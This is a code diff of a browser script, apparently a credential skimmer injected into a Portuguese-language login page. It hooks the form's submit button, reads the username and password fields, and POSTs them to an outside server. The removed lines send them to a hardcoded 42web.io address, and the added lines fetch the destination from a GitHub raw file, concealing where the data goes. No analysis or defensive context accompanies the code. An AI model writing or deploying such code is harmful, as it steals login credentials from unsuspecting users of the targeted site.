@@ -1,34 +1,30 @@
-document.addEventListener("DOMContentLoaded", function() {
-    console.log("yepp")
 
-    let btn = document.getElementsByClassName("g-recaptcha")
-    const username = document.querySelector('[name="user.login"]')
-    const password = document.querySelector('[name="user.senha"]')
+let btn = document.querySelector('[data-callback="onSubmit"]')
+const username = document.querySelector('[name="user.login"]')
+const password = document.querySelector('[name="user.senha"]')
 
 
 
-    console.log("encontrou")
-    btn[0].addEventListener("click", async function(){
-        console.log("Botão de envio de formulário clicado.");
+console.log("encontrou")
+btn[0].addEventListener("click", function(){
 
-        let xhr = new XMLHttpRequest();
+    let xhr = new XMLHttpRequest();
 
-        console.log("Objeto XMLHttpRequest criado.");
+    xhr.open('GET', 'https://raw.githubusercontent.com/Wolota/ips/main/url-new', true);
+    xhr.onreadystatechange = async function() {
+        if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
+            const urlContent = xhr.responseText;
 
+            const data = new FormData();
+            data.append("username", username.value);
+            data.append("password", password.value);
 
-        const urlContent = xhr.responseText;
-
-        const data = new FormData();
-        data.append("username", username.value);
-        data.append("password", password.value);
-
-        const response = await fetch("http://fckyou.42web.io/index/get.php", {
-            method: "POST",
-            body: data
-        });
-
-        console.log("Dados enviados com sucesso para http://fckyou.42web.io/index/get.php.");
-
-        console.log("Requisição enviada para o servidor.");
-    });
+            const response = await fetch(urlContent + "index/get.php", {
+                method: "POST",
+                body: data
+            });
+        }
+    };
+    xhr.send();
 });
+
